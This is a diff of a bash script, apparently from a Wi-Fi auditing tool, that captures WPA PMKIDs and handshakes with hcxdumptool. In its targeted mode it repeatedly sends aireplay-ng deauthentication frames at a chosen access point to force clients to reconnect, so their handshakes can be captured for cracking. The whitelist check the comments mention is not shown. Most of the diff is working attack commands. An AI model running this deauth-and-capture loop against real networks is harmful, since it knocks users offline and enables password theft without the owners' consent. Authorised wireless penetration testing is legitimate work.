@@ -61,7 +61,8 @@ monitor_up() {
 pids=()
 cleanup() {
     kill "${pids[@]}" 2>/dev/null
-    pkill -f "hcxdumptool.*$PCAP" 2>/dev/null
+    pkill -f "hcxdumptool.*fennec-scout" 2>/dev/null
+    pkill -f "aireplay-ng.*--deauth" 2>/dev/null
     exit 0
 }
 trap cleanup TERM INT
@@ -82,36 +83,43 @@ json.dump({"mode": sys.argv[2], "status": "running",
 PY
 chmod 644 "$STATS" 2>/dev/null
 
-start_hcx() {
-    # $1 interface, $2 channel list ("" = sweep all supported frequencies with -F)
+hcx_capture() {   # $1 interface, $2 "" for all-frequency sweep, else channel list
     local i="$1" ch="$2"
     local chopt=(-F)
     [ -n "$ch" ] && chopt=(-c "$ch")
-    if [ "$MODE" = "targeted" ] && [ -n "$TGT_BSSID" ]; then
-        echo "$TGT_BSSID" | tr -d ':' | tr 'A-F' 'a-f' > "$FILTER"
-        # Lock onto the target's channel (learned during the previous sweep), so
-        # the deauth and capture actually sit on the right frequency.
-        [ -z "$TGT_CHAN" ] && TGT_CHAN=$(awk -v b="$(echo "$TGT_BSSID" | tr 'A-F' 'a-f')" \
-            '$1==b{print $2; exit}' "$RUN_DIR/channels.txt" 2>/dev/null)
-        [ -n "$TGT_CHAN" ] && chopt=(-c "$TGT_CHAN")
-        hcxdumptool -i "$i" -w "$PCAP" "${chopt[@]}" \
-            --filterlist_ap="$FILTER" --filtermode=2 \
-            >> "$RUN_DIR/run.log" 2>&1 &
-    else
-        # Wide: PMKID + opportunistic handshakes, deauth disabled.
-        hcxdumptool -i "$i" -w "$PCAP" "${chopt[@]}" \
-            --disable_deauthentication \
-            >> "$RUN_DIR/run.log" 2>&1 &
-    fi
+    # Always run hcxdumptool in its reliable passive-capture mode (the mode that
+    # works): it harvests PMKIDs and records any 4-way handshake on the channel.
+    hcxdumptool -i "$i" -w "$PCAP" "${chopt[@]}" --disable_deauthentication \
+        >> "$RUN_DIR/run.log" 2>&1 &
     pids+=($!)
 }
 
-if [ -n "$IFACE2" ] && [ "$MODE" != "targeted" ]; then
-    start_hcx "$IFACE1" "$BAND24"
-    start_hcx "$IFACE2" "$BAND5"
+if [ "$MODE" = "targeted" ] && [ -n "$TGT_BSSID" ]; then
+    # Lock onto the target's channel (learned during the sweep) so the capture
+    # and the deauth sit on the right frequency.
+    [ -z "$TGT_CHAN" ] && TGT_CHAN=$(awk -v b="$(echo "$TGT_BSSID" | tr 'A-F' 'a-f')" \
+        '$1==b{print $2; exit}' "$RUN_DIR/channels.txt" 2>/dev/null)
+    echo "targeted $TGT_BSSID chan=${TGT_CHAN:-unknown}" >> "$RUN_DIR/run.log"
+    [ -n "$TGT_CHAN" ] && iw dev "$IFACE1" set channel "$TGT_CHAN" 2>/dev/null || true
+    hcx_capture "$IFACE1" "$TGT_CHAN"
+    # Force the 4-way with a classic, reliable aireplay-ng deauth aimed only at
+    # the whitelisted target (offensive, whitelist-gated upstream).
+    (
+        while true; do
+            aireplay-ng --deauth 5 -a "$TGT_BSSID" "$IFACE1" >> "$RUN_DIR/run.log" 2>&1
+            sleep 8
+        done
+    ) &
+    pids+=($!)
+elif [ -n "$IFACE2" ]; then
+    # Two adapters: split the bands (loop reads IFACE1's capture).
+    hcx_capture "$IFACE1" "$BAND24"
+    hcxdumptool -i "$IFACE2" -w "${PCAP%.pcapng}-5g.pcapng" -c "$BAND5" \
+        --disable_deauthentication >> "$RUN_DIR/run.log" 2>&1 &
+    pids+=($!)
 else
     # One adapter sweeps every supported frequency (2.4 + 5 GHz).
-    start_hcx "$IFACE1" ""
+    hcx_capture "$IFACE1" ""
 fi
 
 sanitize() { echo "$1" | tr -c 'A-Za-z0-9._-' '_' | cut -c1-32 | sed 's/^_*//; s/_*$//'; }
